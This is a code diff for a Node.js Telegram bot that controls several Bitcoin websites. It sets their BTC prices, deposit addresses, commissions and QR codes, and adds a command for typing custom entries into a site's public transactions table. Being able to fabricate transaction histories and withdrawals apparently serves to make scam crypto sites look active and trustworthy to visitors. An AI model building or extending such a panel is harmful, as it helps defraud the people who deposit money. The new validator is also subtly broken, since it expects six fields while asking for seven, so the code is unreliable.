@@ -66,6 +66,10 @@ bot.setMyCommands([
     command: "/set_qr_deposit_site",
     description: "Set a picture for the qr deposit code on the site",
   },
+  {
+    command: "/set_custom_transaction_site",
+    description: "Set a transaction for the transactions table on the site",
+  },
   { command: "/set_price", description: "Set a price BTC" },
   { command: "/set_address", description: "Set a Bitcoin address" },
   { command: "/set_commission_precent", description: "Set a commission" },
@@ -85,7 +89,6 @@ bot.setMyCommands([
 ]);
 
 bot.on("message", (msg) => {
-
   users = JSON.parse(fs.readFileSync("./assets/data/users.json"));
 
   var user = users.filter((x) => x.id === msg.from.id)[0];
@@ -176,6 +179,14 @@ function sendCurrentSite(msg) {
     set_settings(user.qr_settings, chatId, bot, "qr", site);
   } else if (userStep == "qr_deposit") {
     set_settings(user.qr_deposit_settings, chatId, bot, "qr_deposit", site);
+  } else if (userStep == "custom_transactions_settings") {
+    set_settings(
+      user.custom_transactions_settings,
+      chatId,
+      bot,
+      "custom_transactions_settings",
+      site
+    );
   } else if (userStep == "bitcoin-title") {
     set_bitcoin_keys(user, chatId, bot, site);
   } else if (userStep == "bitcoin-keys") {
@@ -189,11 +200,23 @@ function sendCurrentSite(msg) {
   } else if (userStep == "replain_id") {
     set_settings(user.replain_id, chatId, bot, "set_replain_id", site);
   } else if (userStep == "sms_bitcoin_price") {
-    set_settings(user.sms_bitcoin_price, chatId, bot, "sms_bitcoin_price", site);
+    set_settings(
+      user.sms_bitcoin_price,
+      chatId,
+      bot,
+      "sms_bitcoin_price",
+      site
+    );
   } else if (userStep == "site_name") {
     set_settings(user.site_name, chatId, bot, "site_name", site);
   } else if (userStep == "additional-btc-price") {
-    set_settings(user.additional_btc_price, chatId, bot, "additional-btc-price", site);
+    set_settings(
+      user.additional_btc_price,
+      chatId,
+      bot,
+      "additional-btc-price",
+      site
+    );
   } else if (userStep == "commission_precent") {
     set_settings(
       user.commission_precent,
@@ -261,6 +284,44 @@ function set_qr_deposit(msg) {
 
   bot.on("message", sendCurrentSite);
   bot.removeListener("message", set_qr_deposit);
+}
+function set_custom_transactions_settings(msg) {
+  let chatId = msg.chat.id;
+  let text = msg.text;
+  var user = users.filter((x) => x.id === msg.from.id)[0];
+
+  // NO, time, address, txid, amount, chain, status
+  const transactionValidate = text.split(", ")
+
+  if (transactionValidate.length != 6){
+    bot.sendMessage(chatId, "You entered wrong data! Please re-type in this format:\n\nNO, time, address, txid, amount, chain, status")
+
+    return
+  }
+
+  const transactionData = { no: transactionValidate[0], time: transactionValidate[1], address: transactionValidate[2], txid: transactionValidate[3], amount: transactionValidate[4], chain: transactionValidate[5], status: transactionValidate[6] }
+
+  user.custom_transactions_settings = transactionData;
+  user.step = "custom_transactions_settings";
+
+  fs.writeFileSync(
+    "./assets/data/users.json",
+    JSON.stringify(users, null, "\t")
+  );
+
+  let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
+  bot.sendMessage(
+    chatId,
+    `Great! Now send for which site you want to change the data ATTENTION ENTER A CLEAR NAME WITHOUT '' "" , ! available:`
+  );
+
+  for (let site in sties) {
+    let s = sties[site].site;
+    bot.sendMessage(chatId, s);
+  }
+
+  bot.on("message", sendCurrentSite);
+  bot.removeListener("message", set_custom_transactions_settings);
 }
 
 function set_commission_precent(msg) {
@@ -344,12 +405,10 @@ function set_api_key(msg) {
   bot.removeListener("message", set_api_key);
 }
 
-
 function additional_btc_price(msg) {
   let chatId = msg.chat.id;
 
   try {
-
     let text = msg.text;
     var user = users.filter((x) => x.id === msg.from.id)[0];
 
@@ -362,7 +421,7 @@ function additional_btc_price(msg) {
     );
 
     if (user.additional_btc_price.length !== 3) {
-      throw Error("Length of text not 3, please enter correct text")
+      throw Error("Length of text not 3, please enter correct text");
     }
 
     let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
@@ -379,9 +438,8 @@ function additional_btc_price(msg) {
     bot.on("message", sendCurrentSite);
     bot.removeListener("message", additional_btc_price);
   } catch (err) {
-    bot.sendMessage(chatId, `Error: ${err}`)
+    bot.sendMessage(chatId, `Error: ${err}`);
     bot.removeListener("message", additional_btc_price);
-
   }
 }
 
@@ -685,7 +743,10 @@ function sendMessages(command, chatId) {
         break;
 
       case "additional_btc_price":
-        bot.sendMessage(chatId, "Ok now enter recent withdraws transactions: transaction_0, transaction_1, transaction_3");
+        bot.sendMessage(
+          chatId,
+          "Ok now enter recent withdraws transactions: transaction_0, transaction_1, transaction_3"
+        );
         bot.on("message", additional_btc_price);
         break;
 
@@ -735,6 +796,14 @@ function sendMessages(command, chatId) {
         bot.on("message", set_qr_deposit);
         break;
 
+      case "set_custom_transaction_site":
+        bot.sendMessage(
+          chatId,
+          "Enter a data to the transaction in this format:\n\nNO, time, address, txid, amount, chain, status\n\nFor example:\n203, 2024-09-09 17:31:42, 1Ddmj****oa9bm, 584873h23h, 0.0123456 BTC, Bitcoin, Success"
+        );
+        bot.on("message", set_custom_transactions_settings);
+        break;
+
       case "clear_users":
         request.get("https://hexocrypt.com/api/clear_base");
         bot.sendMessage(chatId, "The user database was successfully cleared.");
@@ -759,7 +828,10 @@ function sendMessages(command, chatId) {
         bot.on("message", set_replain_id);
         break;
       case "set_sms_bitcoin_price":
-        bot.sendMessage(chatId, "Enter the price in BTC, but be careful if you need to enter cents, do not write 100,10 - the converter will not work and the site will not be in bitcoins, write like this 100.10");
+        bot.sendMessage(
+          chatId,
+          "Enter the price in BTC, but be careful if you need to enter cents, do not write 100,10 - the converter will not work and the site will not be in bitcoins, write like this 100.10"
+        );
         bot.on("message", set_sms_bitcoin_price);
         break;
       case "set_site_name":
